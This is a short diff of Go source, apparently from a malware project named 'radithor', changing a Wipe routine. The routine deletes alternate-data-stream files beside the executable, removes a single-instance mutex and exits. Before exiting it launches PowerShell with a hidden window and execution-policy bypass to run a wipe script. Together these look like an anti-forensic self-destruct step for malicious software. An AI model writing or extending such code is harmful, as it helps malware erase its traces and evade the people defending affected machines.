@@ -8,14 +8,15 @@ import (
 	"strings"
 	"time"
 
+	"radithor/core"
 	"radithor/store"
 
 	"github.com/horobimasu/gotils"
 )
 
-// todo, delete mutex
-
 func Wipe(cipherDrive bool) error {
+	core.LogInfo("[Wipe] reached!")
+
 	var cipherPath string
 
 	if cipherDrive {
@@ -58,14 +59,14 @@ func Wipe(cipherDrive bool) error {
 	}
 
 	if store.DEBUG_MODE_ENABLED {
-		oldFileName := filepath.Base(store.ExecPath)
+		hostName := filepath.Base(store.ExecPath)
 
 		items, err := os.ReadDir(store.ExecDir)
 		if err != nil {
 			return err
 		}
 
-		pattern := regexp.MustCompile("^" + regexp.QuoteMeta(oldFileName) + "_ads_[^_]+_[0-9a-f]{12}$")
+		pattern := regexp.MustCompile("^" + regexp.QuoteMeta(hostName) + "_ads_[^_]+_[0-9a-f]{12}$")
 
 		for _, item := range items {
 			if item.IsDir() {
@@ -80,7 +81,9 @@ func Wipe(cipherDrive bool) error {
 		}
 	}
 
+	core.RemoveMutex()
+
 	defer os.Exit(0)
 
-	return gotils.RunCommand("powershell", "-nop", "-w", "hidden", "-ep", "bypass", "-file", wipePath)
+	return gotils.RunProgram("powershell", "-nop", "-w", "hidden", "-ep", "bypass", "-file", wipePath)
 }
